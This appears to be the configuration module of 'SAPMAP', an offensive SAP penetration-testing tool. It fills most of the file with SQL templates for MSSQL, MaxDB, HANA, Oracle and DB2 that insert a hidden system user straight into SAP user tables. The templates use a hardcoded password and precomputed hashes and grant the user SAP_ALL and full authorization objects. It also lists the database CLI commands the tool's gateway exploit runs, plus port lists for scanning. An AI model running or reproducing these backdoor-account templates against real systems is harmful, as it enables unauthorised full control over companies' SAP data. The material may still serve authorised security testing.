#!/usr/bin/env python3
"""
SAPMAP Configuration — Constants, password hashes, SQL templates, defaults.

Translates the SQL user-creation logic from CREATE_USER_INTERACTIVE_LIN.bat
into pure Python templates usable by the exploitation engine.
"""

# ---------------------------------------------------------------------------
# SAPMAP user creation
# ---------------------------------------------------------------------------

SAPMAP_USER_PREFIX = "SAPMAP"
SAPMAP_USER_MAX = 99   # SAPMAP00 .. SAPMAP99

# Password for SAPMAP00 — used for all creation methods (BAPI, GW exploit, SXPG).
SAPMAP_PASSWORD = "Andinyougo123!"
# Legacy aliases — point to the single password for backward compat.
SAPMAP_PASSWORD_ABAP = SAPMAP_PASSWORD
SAPMAP_PASSWORD_BAPI = SAPMAP_PASSWORD

# Pre-generated password hashes for user SAPMAP00 with password "Andinyougo123!"
# Note: SAP hashes are username-dependent — these are ONLY valid for SAPMAP00.
# Used by the GW exploit and SXPG exploit (direct DB insert).
BCODE_HEX = "3E6632FB15070BA1"
PASSCODE_HEX = "1C21FA470B3D34F6FC60A4CD27D17473FB6AA9E6"

# User type S = System / Service user (no dialog logon restrictions apply)
USER_TYPE = "S"
CODVN = "G"  # password hash version (G = SHA-1 salted, common on 7.x kernels)


def sapmap_username(index: int) -> str:
    """Generate SAPMAP username for a given index (00..99)."""
    return f"{SAPMAP_USER_PREFIX}{index:02d}"


# ---------------------------------------------------------------------------
# SQL templates per database type
# ---------------------------------------------------------------------------
# Each template set returns a list of SQL statements.
# Every generator first DELETEs the user if it already exists, then INSERTs.


def _cleanup_sql(client: str, username: str) -> list:
    """DELETE statements to remove a user before re-creating it."""
    return [
        f"DELETE FROM USRBF2 WHERE MANDT='{client}' AND BNAME='{username}'",
        f"DELETE FROM USR04 WHERE MANDT='{client}' AND BNAME='{username}'",
        f"DELETE FROM UST04 WHERE MANDT='{client}' AND BNAME='{username}'",
        f"DELETE FROM USREFUS WHERE MANDT='{client}' AND BNAME='{username}'",
        f"DELETE FROM USR02 WHERE MANDT='{client}' AND BNAME='{username}'",
    ]

def sql_mssql_abap(sid: str, client: str, username: str) -> list:
    """MSSQL ABAP stack — T-SQL statements.

    SAP MSSQL installations use a case-sensitive collation.  The database
    name (USE / -d flag) is uppercase (e.g. TWT), but the schema that owns
    the SAP tables is lowercase (e.g. twt) — matching the dbs/mss/schema
    profile parameter.  Using uppercase schema names causes 'Invalid object
    name' errors on case-sensitive installations.
    """
    DB  = sid.upper()   # Database name: USE TWT / sqlcmd -d TWT
    SCH = sid.lower()   # Schema owner:  twt.USR02 (case-sensitive!)
    # Cleanup first, then create
    cleanup = []
    for tbl in ["USRBF2", "USR04", "UST04", "USREFUS", "USR02"]:
        cleanup += [
            f"DELETE FROM {SCH}.{tbl} WHERE MANDT='{client}' AND BNAME='{username}'",
            "GO",
        ]
    return [
        f"USE {DB}",
        "GO",
    ] + cleanup + [
        f"INSERT INTO {SCH}.USR02 (MANDT,BNAME,USTYP,CODVN) "
        f"VALUES ('{client}','{username}','{USER_TYPE}','{CODVN}')",
        "GO",
        f"UPDATE {SCH}.USR02 SET BCODE=0x{BCODE_HEX} "
        f"WHERE MANDT='{client}' AND BNAME='{username}'",
        "GO",
        f"UPDATE {SCH}.USR02 SET PASSCODE=0x{PASSCODE_HEX} "
        f"WHERE MANDT='{client}' AND BNAME='{username}'",
        "GO",
        f"INSERT INTO {SCH}.USREFUS (MANDT,BNAME,REFUSER) "
        f"VALUES ('{client}','{username}','DDIC')",
        "GO",
        f"INSERT INTO {SCH}.UST04 (MANDT,BNAME,PROFILE) "
        f"VALUES ('{client}','{username}','SAP_ALL')",
        "GO",
        f"INSERT INTO {SCH}.UST04 (MANDT,BNAME,PROFILE) "
        f"VALUES ('{client}','{username}','SAP_NEW')",
        "GO",
        f"INSERT INTO {SCH}.USR04 (MANDT,BNAME,NRPRO,PROFS) "
        f"VALUES ('{client}','{username}','14','C SAP_ALL')",
        "GO",
        # Authorization object entries (USRBF2)
        f"INSERT INTO {SCH}.USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_ADMI_FCD','&_SAP_ALL')",
        "GO",
        f"INSERT INTO {SCH}.USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_DATASET','&_SAP_ALL')",
        "GO",
        f"INSERT INTO {SCH}.USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_DEVELOP','&_SAP_ALL')",
        "GO",
        f"INSERT INTO {SCH}.USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_RFC','&_SAP_ALL')",
        "GO",
        f"INSERT INTO {SCH}.USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_TABU_DIS','&_SAP_ALL')",
        "GO",
        f"INSERT INTO {SCH}.USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_TCODE','&_SAP_ALL')",
        "GO",
        f"INSERT INTO {SCH}.USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_USER_AUT','&_SAP_ALL')",
        "GO",
        f"INSERT INTO {SCH}.USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_USER_GRP','&_SAP_ALL')",
        "GO",
        f"INSERT INTO {SCH}.USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_USER_PRO','&_SAP_ALL')",
        "GO",
        f"INSERT INTO {SCH}.USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_XMI_PROD','&_SAP_ALL')",
        "GO",
    ]


def sql_mssql_java(sid: str, client: str, username: str) -> list:
    """MSSQL Java stack — T-SQL statements (UME_STRINGS table)."""
    SID = sid.upper()
    return [
        f"USE {SID}",
        "GO",
        f"INSERT INTO {SID}.UME_STRINGS (MANDT,BNAME,USTYP,CODVN) "
        f"VALUES ('{client}','{username}','{USER_TYPE}','{CODVN}')",
        "GO",
        f"UPDATE {SID}.UME_STRINGS SET BCODE=0x{BCODE_HEX} "
        f"WHERE MANDT='{client}' AND BNAME='{username}'",
        "GO",
        f"UPDATE {SID}.UME_STRINGS SET PASSCODE=0x{PASSCODE_HEX} "
        f"WHERE MANDT='{client}' AND BNAME='{username}'",
        "GO",
        f"INSERT INTO {SID}.USREFUS (MANDT,BNAME,REFUSER) "
        f"VALUES ('{client}','{username}','DDIC')",
        "GO",
    ]


def sql_maxdb(sid: str, client: str, username: str) -> list:
    """MaxDB — sqlcli statements."""
    return _cleanup_sql(client, username) + [
        f"INSERT INTO USR02 (MANDT,BNAME,BCODE,USTYP,CODVN) "
        f"VALUES ('{client}','{username}',x'{BCODE_HEX}','{USER_TYPE}','{CODVN}')",
        f"UPDATE USR02 SET PASSCODE=x'{PASSCODE_HEX}' "
        f"WHERE BNAME='{username}' AND MANDT='{client}'",
        f"INSERT INTO USREFUS (MANDT,BNAME,REFUSER) "
        f"VALUES ('{client}','{username}','DDIC')",
        f"INSERT INTO UST04 (MANDT,BNAME,PROFILE) "
        f"VALUES ('{client}','{username}','SAP_ALL')",
        f"INSERT INTO UST04 (MANDT,BNAME,PROFILE) "
        f"VALUES ('{client}','{username}','SAP_NEW')",
        f"INSERT INTO USR04 (MANDT,BNAME,NRPRO,PROFS) "
        f"VALUES ('{client}','{username}','14','C SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_ADMI_FCD','&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_DATASET','&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_DEVELOP','&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_RFC','&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_TABU_DIS','&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_TCODE','&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_USER_AUT','&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_USER_GRP','&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_USER_PRO','&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_XMI_PROD','&_SAP_ALL')",
    ]


def sql_hana(sid: str, client: str, username: str) -> list:
    """HANA DB — hdbsql statements (no schema prefix, -U DEFAULT sets it)."""
    return _cleanup_sql(client, username) + [
        f"INSERT INTO USR02 (MANDT,BNAME,USTYP,CODVN) "
        f"VALUES ('{client}','{username}','{USER_TYPE}','{CODVN}')",
        f"UPDATE USR02 SET BCODE='{BCODE_HEX}' "
        f"WHERE MANDT='{client}' AND BNAME='{username}'",
        f"UPDATE USR02 SET PASSCODE='{PASSCODE_HEX}' "
        f"WHERE MANDT='{client}' AND BNAME='{username}'",
        f"INSERT INTO USREFUS (MANDT,BNAME,REFUSER) "
        f"VALUES ('{client}','{username}','DDIC')",
        f"INSERT INTO UST04 (MANDT,BNAME,PROFILE) "
        f"VALUES ('{client}','{username}','SAP_ALL')",
        f"INSERT INTO UST04 (MANDT,BNAME,PROFILE) "
        f"VALUES ('{client}','{username}','SAP_NEW')",
        f"INSERT INTO USR04 (MANDT,BNAME,NRPRO,PROFS) "
        f"VALUES ('{client}','{username}','14','C SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_ADMI_FCD','&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_DATASET','&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_DEVELOP','&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_RFC','&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_TABU_DIS','&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_TCODE','&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_USER_AUT','&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_USER_GRP','&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_USER_PRO','&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_XMI_PROD','&_SAP_ALL')",
    ]


def sql_oracle(sid: str, client: str, username: str, schema: str = "SAPSR3",
               codvn: str = None) -> list:
    """Oracle — sqlplus statements (sysdba auth).

    schema: SAP DB owner schema — 'SAPSR3' (ECC 6.x+) or 'SAPR3' (R/3 4.x).
    codvn:  password hash version.  Defaults to global CODVN ('G').
            Use 'B' for old kernels (700-era) that don't support CODVN=G.
            CODVN=B uses only BCODE (DES, first 8 uppercase chars of password).
            CODVN=G additionally writes PASSCODE (SHA-1 extended hash).

    GLTGB='99991231': set explicitly so old kernels don't treat a missing
    valid-to date as an expired account.

    Each statement ends with ;COMMIT;EXIT; so sqlplus commits even in batch mode.
    """
    s = schema
    _codvn = codvn if codvn is not None else CODVN
    cleanup = [f"DELETE FROM {s}.{t} WHERE MANDT='{client}' AND BNAME='{username}';COMMIT;EXIT;"
               for t in ("USRBF2", "USR04", "UST04", "USREFUS", "USR02")]
    stmts = ["CONNECT / AS SYSDBA"] + cleanup + [
        f"INSERT INTO {s}.USR02 (MANDT,BNAME,BCODE,USTYP,CODVN,GLTGB) "
        f"VALUES ('{client}','{username}','{BCODE_HEX}','{USER_TYPE}','{_codvn}','99991231');COMMIT;EXIT;",
    ]
    if _codvn != 'B':
        # CODVN=B uses only BCODE — no PASSCODE field needed.
        # CODVN=G (and later) require PASSCODE for case-sensitive password verification.
        stmts.append(
            f"UPDATE {s}.USR02 SET PASSCODE='{PASSCODE_HEX}' "
            f"WHERE BNAME='{username}' AND MANDT='{client}';COMMIT;EXIT;"
        )
    # Modern kernels (7.30+ with login/password_hash_algorithm=SHA-256)
    # prefer PWDSALTEDHASH over BCODE/PASSCODE.  If PWDSALTEDHASH is set
    # (or SALT has a stale value), the kernel checks SHA-256+SALT against
    # our password and fails — even though BCODE/PASSCODE would match.
    # Clear both so the kernel falls back to CODVN=G verification.
    # Wrapped in a per-column NULL update: harmless if the column doesn't
    # exist (Oracle returns "invalid identifier" for missing columns —
    # sqlplus continues past that error and still commits the previous
    # write).  Applied via IF-EXISTS-style guard is not possible in
    # Oracle without PL/SQL blocks, so we just emit the UPDATE and let
    # sqlplus report ORA-00904 on old kernels without the column.
    stmts.append(
        f"UPDATE {s}.USR02 SET SALT=NULL "
        f"WHERE BNAME='{username}' AND MANDT='{client}';COMMIT;EXIT;"
    )
    stmts.append(
        f"UPDATE {s}.USR02 SET PWDSALTEDHASH=NULL "
        f"WHERE BNAME='{username}' AND MANDT='{client}';COMMIT;EXIT;"
    )
    stmts += [
        f"INSERT INTO {s}.USREFUS (MANDT,BNAME,REFUSER) "
        f"VALUES ('{client}','{username}','DDIC');COMMIT;EXIT;",
        f"INSERT INTO {s}.UST04 (MANDT,BNAME,PROFILE) "
        f"VALUES ('{client}','{username}','SAP_ALL');COMMIT;EXIT;",
        f"INSERT INTO {s}.UST04 (MANDT,BNAME,PROFILE) "
        f"VALUES ('{client}','{username}','SAP_NEW');COMMIT;EXIT;",
        f"INSERT INTO {s}.USR04 (MANDT,BNAME,NRPRO,PROFS) "
        f"VALUES ('{client}','{username}','14','C SAP_ALL');COMMIT;EXIT;",
        f"INSERT INTO {s}.USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_ADMI_FCD','&_SAP_ALL');COMMIT;EXIT;",
        f"INSERT INTO {s}.USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_DATASET','&_SAP_ALL');COMMIT;EXIT;",
        f"INSERT INTO {s}.USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_DEVELOP','&_SAP_ALL');COMMIT;EXIT;",
        f"INSERT INTO {s}.USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_RFC','&_SAP_ALL');COMMIT;EXIT;",
        f"INSERT INTO {s}.USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_TABU_DIS','&_SAP_ALL');COMMIT;EXIT;",
        f"INSERT INTO {s}.USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_TCODE','&_SAP_ALL');COMMIT;EXIT;",
        f"INSERT INTO {s}.USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_USER_AUT','&_SAP_ALL');COMMIT;EXIT;",
        f"INSERT INTO {s}.USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_USER_GRP','&_SAP_ALL');COMMIT;EXIT;",
        f"INSERT INTO {s}.USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_USER_PRO','&_SAP_ALL');COMMIT;EXIT;",
        f"INSERT INTO {s}.USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_XMI_PROD','&_SAP_ALL');COMMIT;EXIT;",
    ]
    return stmts


def sql_db2(sid: str, client: str, username: str) -> list:
    """DB2 — db2 CLI statements."""
    return _cleanup_sql(client, username) + [
        f"INSERT INTO USR02 (MANDT,BNAME,BCODE,USTYP,CODVN) "
        f"VALUES ('{client}','{username}','{BCODE_HEX}','{USER_TYPE}','{CODVN}')",
        f"UPDATE USR02 SET PASSCODE='{PASSCODE_HEX}' "
        f"WHERE BNAME='{username}' AND MANDT='{client}'",
        f"INSERT INTO USREFUS (MANDT,BNAME,REFUSER) "
        f"VALUES ('{client}','{username}','DDIC')",
        f"INSERT INTO UST04 (MANDT,BNAME,PROFILE) "
        f"VALUES ('{client}','{username}','SAP_ALL')",
        f"INSERT INTO UST04 (MANDT,BNAME,PROFILE) "
        f"VALUES ('{client}','{username}','SAP_NEW')",
        f"INSERT INTO USR04 (MANDT,BNAME,NRPRO,PROFS) "
        f"VALUES ('{client}','{username}','14','C SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_ADMI_FCD','&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_DATASET','&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_DEVELOP','&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_RFC','&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_TABU_DIS','&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_TCODE','&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_USER_AUT','&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_USER_GRP','&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_USER_PRO','&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_XMI_PROD','&_SAP_ALL')",
    ]


# Map DB type identifier to SQL generator
SQL_GENERATORS = {
    "MSS":      sql_mssql_abap,    # MSSQL
    "MSSQL":    sql_mssql_abap,
    "ADA":      sql_maxdb,          # MaxDB / SAP DB / ADABAS D
    "MAXDB":    sql_maxdb,
    "ADABAS":   sql_maxdb,          # "ADABAS D" after normalize
    "HDB":      sql_hana,           # HANA
    "HANA":     sql_hana,
    "ORA":      sql_oracle,         # Oracle
    "ORACLE":   sql_oracle,
    "DB6":      sql_db2,            # DB2
    "DB2":      sql_db2,
}

# DB CLI command templates (for gateway exploit execution)
DB_CLI_COMMANDS = {
    "MSS":      'sqlcmd -S {db_host} -i {sql_file}',
    "ADA":      'sqlcli -U DEFAULT {sql_statement}',
    "MAXDB":    'sqlcli -U DEFAULT {sql_statement}',
    "ADABAS":   'sqlcli -U DEFAULT {sql_statement}',
    "HDB":      'hdbsql -n {db_host} -i 00 -U DEFAULT -o output.txt -I {sql_file}',
    "ORA":      'sqlplus -S /NOLOG @{sql_file}',
    "DB6":      'db2 {sql_statement}',
}


def normalize_db_type(db_type_raw: str) -> str:
    """Normalize a database type string to a canonical key for SQL_GENERATORS.

    Handles variants like "ADABAS D", "MaxDB", "HDB", "HANA", etc.
    Returns the uppercase canonical key or the cleaned input if unknown.
    """
    dt = db_type_raw.strip().upper()
    # Direct match first
    if dt in SQL_GENERATORS:
        return dt
    # Known aliases / substrings
    if "ADABAS" in dt or "MAXDB" in dt or "ADA" in dt:
        return "ADA"
    if "HDB" in dt or "HANA" in dt:
        return "HDB"
    if "MSS" in dt or "MSSQL" in dt or "MICROSOFT" in dt:
        return "MSS"
    if "ORA" in dt or "ORACLE" in dt:
        return "ORA"
    if "DB2" in dt or "DB6" in dt:
        return "DB6"
    return dt


# ---------------------------------------------------------------------------
# Scanning defaults
# ---------------------------------------------------------------------------

DEFAULT_INSTANCE_RANGE = (0, 99)
DEFAULT_THREADS = 20
DEFAULT_TIMEOUT = 3     # seconds
DEFAULT_POLL_INTERVAL = 3
DEFAULT_MAX_POLL_ATTEMPTS = 40

# Fast scan: only these port patterns
FAST_SCAN_PORT_PATTERNS = {
    "dispatcher": 3200,    # 3200 + instance_nr
}

# ---------------------------------------------------------------------------
# SAP Web Dispatcher ports
# ---------------------------------------------------------------------------
#
# The WD is the front-end SAP customers expose on the internet — typically
# behind a CDN / WAF, but often directly reachable from a developer
# workstation in lab and engagement-day scenarios.  The same `sapwebdisp`
# binary that runs as the WD also runs as the ICM in every NW kernel,
# so the port patterns overlap with regular ABAP/Java instance HTTP
# ports.  We split the list into two buckets:
#
#   (a) WELL_KNOWN_WD_PORTS — fixed-number ports configured via
#       `icm/server_port_<n>=PROT=...,PORT=NNNN` in `sapwebdisp.pfl`.
#       80 / 443 / 8080 / 8443 are the production-facing canonical
#       choices; 8000-8020 covers SAP-default `80NN` (instance 00-20)
#       for standalone WDs that DON'T expose a dispatcher 32XX (so
#       the per-instance HTTP/HTTPS pattern never fires on them).
#       Operator lab WD on 172.31.14.107:8011 (instance 11) was
#       missed pre-this-expansion — confirmed regression added.
#   (b) Instance-relative ports — 80NN (HTTP, where NN is the instance
#       number) and 443NN (HTTPS) follow the SAP `icm/server_port`
#       formula and are already scanned via the per-instance Java
#       HTTP/HTTPS pattern below; 44300+NN (HTTPS) is the historical
#       SAP-default HTTPS port and likewise per-instance.  Those
#       patterns only fire for hosts where a dispatcher 32XX has
#       already been seen — standalone WDs are caught by bucket (a).
#
# Both buckets feed `fast_scan_host`'s Pass 1 so a host that *only*
# runs a WD (no dispatcher 32XX) still gets discovered — without this,
# a hardened DMZ WD with only 443/tcp open would be invisible to
# SAPMAP and the operator would never see the ICMAD finding.

WELL_KNOWN_WD_PORTS = (
    80,        # HTTP — most common production facing
    443,       # HTTPS — most common production facing (TLS)
    # 80NN — SAP-default WD HTTP port for instance NN.  Cover
    # instances 00-20 explicitly so standalone WDs without a
    # dispatcher 32XX still get hit on Pass 1 of the fast scan.
    # Instance numbers above 20 are rare in the field — operator
    # can add them via FAST_SCAN_PORT_PATTERNS if they encounter one.
    8000, 8001, 8002, 8003, 8004, 8005, 8006, 8007, 8008, 8009, 8010,
    8011, 8012, 8013, 8014, 8015, 8016, 8017, 8018, 8019, 8020,
    8080,      # HTTP — alternate, often used behind a reverse proxy
    8443,      # HTTPS — alternate; also SAP Cloud Connector default
    44300,     # HTTPS — SAP-default WD HTTPS port at instance 00
    50000,     # HTTP — AS Java default instance 00 (overlap with WD)
    50001,     # HTTPS — AS Java default instance 00
)

# Additional ports for deep scan (beyond SAPology's full set)
DEEP_SCAN_EXTRA_PORTS = [
    39013, 39015,           # HANA
    7210,                   # MaxDB
    1433,                   # MSSQL
    1521,                   # Oracle
    50000,                  # DB2
]


# ---------------------------------------------------------------------------
# System type colors (matches SAPology pill convention)
# ---------------------------------------------------------------------------

SYSTEM_TYPE_COLORS = {
    "ABAP":            "#0070f2",
    "JAVA":            "#d27700",
    "ABAP+JAVA":       "#0070f2",  # split with orange in rendering
    "BUSINESSOBJECTS": "#8b47d7",
    "CLOUD_CONNECTOR": "#046c7a",
    "CONTENT_SERVER":  "#256f3a",
    "SAPROUTER":       "#788fa6",
    "WEB_DISPATCHER":  "#4d9eb6",   # softer cyan — matches the
                                      # "front-end-only" semantics; close
                                      # to SAProuter but cool, not warm
    "MDM":             "#5d36ff",
    "HANA":            "#aa0808",
    "MAXDB":           "#e07900",
    "MSSQL":           "#2f5ea0",
    "ORACLE":          "#c74634",
    "DB2":             "#054ada",
}

# Map colors
MAP_BG_COLOR = "#1a1a2e"
MAP_NODE_FILL = "#16213e"
MAP_NODE_BORDER_DEFAULT = "#2ecc71"
MAP_NODE_BORDER_CRITICAL = "#8b0000"    # dark red
MAP_NODE_FILL_PRD = "#4a1a1a"           # red-tinted fill for production
MAP_NODE_FILL_NONPROD = "#4a3a1a"       # orange-tinted fill for non-production
MAP_EDGE_SAP_ALL = "#e74c3c"            # red edge for SAP_ALL connections
MAP_EDGE_NO_SAP_ALL = "#5dade2"         # blue edge for regular connections
MAP_EDGE_GW_EXPLOIT = "#ff6b35"         # orange for GW exploit paths


# ---------------------------------------------------------------------------
# RFC Check function parameters
# ---------------------------------------------------------------------------

RFC_CHECK_FM = "/SDF/RFC_CHECK"
RFC_CHECK_PARAMS = {
    "IV_LOGON": "X",
    "IV_PING": "X",
    "IV_LATENCY": "X",
}
RFC_LOGON_SUCCESS_TEXT = "RFC Logon successful."

# BAPI function module names
BAPI_USER_CREATE = "BAPI_USER_CREATE1"
BAPI_USER_DELETE = "BAPI_USER_DELETE"
BAPI_USER_GET_DETAIL = "BAPI_USER_GET_DETAIL"
BAPI_USER_PROFILES_ASSIGN = "BAPI_USER_PROFILES_ASSIGN"
DEST_RFC_TCPIP_CREATE = "DEST_RFC_TCPIP_CREATE"
RFC_READ_TABLE = "RFC_READ_TABLE"
CNV_MBT_SHELL_GET_CLIENTS = "CNV_MBT_SHELL_GET_CLIENTS"


# ---------------------------------------------------------------------------
# RSRFCCHK (RFC connectivity check program)
# ---------------------------------------------------------------------------

RSRFCCHK_PROGRAM = "RSRFCCHK"
RSRFCCHK_JOB_NAME = "SAPMAP_RFCCHK"
RSRFCCHK_EXTERNAL_USER = "SAPMAP"
